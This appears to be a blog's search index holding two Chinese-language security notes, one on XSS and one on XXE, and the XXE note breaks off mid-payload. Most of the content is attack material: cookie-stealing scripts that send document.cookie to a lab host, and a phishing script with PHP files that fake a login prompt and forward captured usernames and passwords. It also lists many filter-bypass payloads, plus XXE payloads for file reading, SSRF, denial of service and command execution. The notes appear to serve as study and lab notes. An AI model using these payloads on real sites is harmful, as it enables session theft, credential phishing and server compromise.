<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/03/22/XSS/"/>
    <url>/2025/03/22/XSS/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>跨站脚本攻击（Cross-Site Scripting，简称XSS）作为一种广泛存在的web应用程序安全漏洞，其机制在于利用了客户端与服务器之间数据交换过程中的信任链被恶意破坏。该类攻击的核心原理是攻击者通过向Web应用程序注入精心构造的、能够在受害者浏览器环境下执行的恶意脚本代码。这些注入的脚本在用户无意识的情况下被执行，不仅能够非法获取用户的cookies、session令牌等身份认证信息，还可能操纵用户的浏览器发起进一步的非授权操作，对用户隐私和网站安全性构成严重威胁。</p><h2 id="反射型XSS（Non-persistent-XSS）"><a href="#反射型XSS（Non-persistent-XSS）" class="headerlink" title="反射型XSS（Non-persistent XSS）"></a>反射型XSS（Non-persistent XSS）</h2><p>这种类型的XSS攻击依赖于用户点击由攻击者精心构造的带有恶意脚本参数的URL，而这些URL通常伪装成合法链接或者嵌入在电子邮件、即时消息等载体中。当服务器接收到这样的请求后，未经验证就将含有恶意脚本的数据直接反映在响应页面中，进而触发执行。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://example.com/search?q=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;你已被黑客入侵&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="存储型XSS（Persistent-or-Stored-XSS）"><a href="#存储型XSS（Persistent-or-Stored-XSS）" class="headerlink" title="存储型XSS（Persistent or Stored XSS）"></a>存储型XSS（Persistent or Stored XSS）</h2><p>存储型XSS具有持久性特点。攻击者将恶意脚本永久地存储在目标服务器上，每当任何用户访问到包含此类恶意内容的页面时，浏览器都会执行其中的恶意脚本。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="基于DOM的XSS（DOM-Based-XSS）"><a href="#基于DOM的XSS（DOM-Based-XSS）" class="headerlink" title="基于DOM的XSS（DOM-Based XSS）"></a>基于DOM的XSS（DOM-Based XSS）</h2><p>这种类型的XSS不涉及服务器端的数据存储，而是发生在客户端层面，即浏览器解析和动态修改DOM树的过程中。如果Web应用程序错误地使用来自不可信源的数据更新DOM，并且没有实施恰当的防御措施，攻击者就可以利用DOM-XSS漏洞注入恶意脚本。</p><p>不涉及服务器端，而是由前端JavaScript代码错误处理用户输入导致的。当浏览器DOM解析过程中引入了不可信的数据并且没有正确地对其进行净化，就会产生DOM-Based XSS。</p><h2 id="xss无过滤常见标签"><a href="#xss无过滤常见标签" class="headerlink" title="xss无过滤常见标签"></a>xss无过滤常见标签</h2><p>弹窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;1&quot;</span>);&lt;/script&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">prompt</span>(<span class="hljs-string">&quot;2&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;3&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;1&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>JS支持unicode编码，但是不可以对script标签进行编码</p><h2 id="XSS获取cookie"><a href="#XSS获取cookie" class="headerlink" title="XSS获取cookie"></a>XSS获取cookie</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27;&quot;&gt;&lt;script&gt;document.location.href=&#x27;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//192.168.31.110/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><h2 id="XSS钓鱼"><a href="#XSS钓鱼" class="headerlink" title="XSS钓鱼"></a>XSS钓鱼</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script src=<span class="hljs-string">&quot;http://192.168.31.172/pikachu/pkxss/xfish/fish.php&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><figure class="highlight php"><figcaption><span>file:fish.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// var_dump($_SERVER);</span><br><span class="hljs-keyword">if</span> ((!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_USER&#x27;</span>])) || (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_PW&#x27;</span>]))) &#123;<br><span class="hljs-comment">//发送认证框，并给出迷惑性的info</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;WWW-Authenticate: Basic realm=&#x27;认证&#x27;&quot;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Authorization Required.&#x27;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_USER&#x27;</span>])) &amp;&amp; (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_PW&#x27;</span>])))&#123;<br><span class="hljs-comment">//将结果发送给搜集信息的后台,请将这里的IP地址修改为管理后台的IP</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://192.168.1.15/pkxss/xfish/xfish.php?username=<span class="hljs-subst">&#123;$_SERVER[PHP_AUTH_USER]&#125;</span>&amp;password=<span class="hljs-subst">&#123;$_SERVER[PHP_AUTH_PW]&#125;</span>&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><figcaption><span>file:xfish.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;../inc/config.inc.php&#x27;</span>;<br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;../inc/mysql.inc.php&#x27;</span>;<br><span class="hljs-variable">$link</span>=<span class="hljs-title function_ invoke__">connect</span>();<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$referer</span>=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable">$referer</span>.=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br>    <span class="hljs-variable">$time</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d g:i:s&#x27;</span>);<br>    <span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;insert fish(time,username,password,referer) </span><br><span class="hljs-string">    values(&#x27;<span class="hljs-subst">$time</span>&#x27;,&#x27;<span class="hljs-subst">$username</span>&#x27;,&#x27;<span class="hljs-subst">$password</span>&#x27;,&#x27;<span class="hljs-subst">$referer</span>&#x27;)&quot;</span>;<br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$link</span>, <span class="hljs-variable">$query</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h2><figure class="highlight js"><figcaption><span>file:base.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;scirpt&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>);&lt;/script&gt;<br><br>#图片加载错误触发<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;<br>&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#x27;xss&#x27;)&quot;)&gt;<br><br>#鼠标指针移动到元素时触发  <br>&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;<br>#鼠标指针移出时触发  <br>&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;<br><br>#js伪协议<br>&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;<br>&lt;iframe src=javascript:alert(&#x27;xss&#x27;);&gt;&lt;/iframe&gt;<br>&lt;img src=javascript:alert(&#x27;xss&#x27;)&gt;<br>&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;<br><br>&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br>竞争焦点，从而触发onblur事件<br>&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;<br>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<br>&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;<br>&lt;input value=&quot;&quot; onclick=alert(&#x27;xss&#x27;) type=&quot;text&quot;&gt;<br>&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#x27;xss&#x27;) bad=&quot;&quot;&gt;<br>&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="XSS过滤绕过"><a href="#XSS过滤绕过" class="headerlink" title="XSS过滤绕过"></a>XSS过滤绕过</h2><p>前端过滤：抓包重发或者修改HTML<br>后端正则过滤：大小写混合输入</p><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>用<code>/</code>替代<br><code>&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</code></p><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p>大小写绕过<br><code>&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;</code><br>双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)<br><code>&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">eval</span>字符拼接<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;a=aler;b=t;c=&#x27;(xss);&#x27;;eval(a+b+c)&quot;</span>&gt;<br>top字符拼接<br>&lt;script&gt;top[<span class="hljs-string">&quot;al&quot;</span>+<span class="hljs-string">&quot;ert&quot;</span>](<span class="hljs-string">`xss`</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Unicode</span>编码绕过<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;</span>&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;&gt;<br><br>url编码绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt;<br>&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;<br><br>Ascii码绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;<br><br>Hex绕过<br>&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;<br><br>八进制绕过<br>&lt;img src=x onerror=alert(&#x27;\170\163\163&#x27;)&gt;<br><br>base64绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;&gt;<br>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;<br></code></pre></td></tr></table></figure><h3 id="过滤双引号，单引号"><a href="#过滤双引号，单引号" class="headerlink" title="过滤双引号，单引号"></a>过滤双引号，单引号</h3><p>如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-string">``</span>xss<span class="hljs-string">``</span>);&gt;<br></code></pre></td></tr></table></figure><p>使用编码绕过，具体看上面列举的例子</p><h3 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h3><p>当括号被过滤的时候可以使用<code>throw</code>来绕过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;svg/onload=<span class="hljs-string">&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">使用url编码<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`</span>&gt;<br>使用<span class="hljs-variable constant_">IP</span><br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">`http://2130706433/`</span>&gt;十进制<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">`http://0177.0.0.01/`</span>&gt;八进制<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">`http://0x7f.0x0.0x0.0x1/`</span>&gt;十六进制<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">`//www.baidu.com`</span>&gt;html标签中用<span class="hljs-comment">//  可以代替http://</span><br>使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在<span class="hljs-title class_">Windows</span>下是file协议，在linux下才会是当前域的协议)<br>使用中文逗号代替英文逗号<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;document.location=http://www。baidu。com&quot;</span>&gt;<span class="hljs-comment">//会自动跳转到百度</span><br></code></pre></td></tr></table></figure><h2 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h2><p><code>&#39; oninput=alert(&quot;1&quot;)//</code>，<code>&#39; onclick=&#39;alert(document.cookie)&#39;//</code>绕过尖括号的实体化，用<code>&#39;</code>闭合</p><p><code>&quot;&gt; &lt;a href=javascript:alert()&gt;xxx&lt;/a&gt; &lt;&quot;</code> 绕过on和&lt;script过滤</p><p>href的隐藏属性自动Unicode解码 绕过<code>&quot;</code>、<code>script</code>、<code>on</code>、<code>src</code>、<code>href</code></p><p><code>html编码</code>后的内容可以绕过后端的过滤，但拼接到前端后，就会被浏览器解码，重新变回字母。例如<code>java&amp;#115;cript:alert(8)</code></p><p><code>&lt;input name=&quot;t_sort&quot; value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code>对于隐藏且过滤<code>&lt;&gt;</code>的，使用<code>&quot; oninput=alert(&#39;1&#39;) type=&quot;text</code>“闭合，注意要有空格</p><p><code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code>图片加载报错<br><code>&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;</code>鼠标指针移动到元素时触发<br><code>&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;</code>鼠标指针移出时触发</p><p>左右尖括号和单引号都被html编码<code>javascript:alert(document.cookie)</code></p><p><code>&#39;&gt;&lt;img src=&#39;#&#39; onerror=&quot;alert(&#39;xss&#39;)&quot;&gt;</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/03/22/XXE-XML/"/>
    <url>/2025/03/22/XXE-XML/</url>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/8041?time__1311=n4+xnD0Dc7=YqD5eGN3xCwwBititC3tHTe4D#toc-3">https://xz.aliyun.com/t/8041?time__1311&#x3D;n4%2BxnD0Dc7%3DYqD5eGN3xCwwBititC3tHTe4D#toc-3</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p><p><a href="https://evilpan.com/2024/06/02/xml-vulnerabilities/#%E5%89%8D%E8%A8%80">https://evilpan.com/2024/06/02/xml-vulnerabilities/#%E5%89%8D%E8%A8%80</a></p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。<br>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。<br>目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。</p><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>XML 文档在开头有 <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 的结构，这种结构被称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，但是必须放在文档开头。</p><p>除了可选的开头外，XML 语法主要有以下的特性：</p><ul><li>所有 XML 元素都须有关闭标签</li><li>XML 标签对大小写敏感</li><li>XML 必须正确地嵌套</li><li>XML 文档必须有根元素</li><li>XML 的属性值需要加引号</li></ul><p>另外，XML也有CDATA语法，用于处理有多个字符需要转义的情况。</p><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>当允许引用外部实体时，可通过构造恶意的XML内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的XXE攻击，只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，但是也可以通过Blind XXE的方式实现攻击。</p><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">data</span> (<span class="hljs-keyword">#ANY</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY a0 <span class="hljs-string">&quot;dos&quot;</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">a1</span> <span class="hljs-string">&quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">a2</span> <span class="hljs-string">&quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span>&amp;a2;<span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><p>若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。</p><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">data</span> (<span class="hljs-keyword">#ANY</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">payload</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;payload;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://publicServer.com/&quot;</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">data</span> (<span class="hljs-keyword">#ANY</span>)&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">GVI</span> [ <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">catalog</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">core</span> <span class="hljs-attr">id</span>=<span 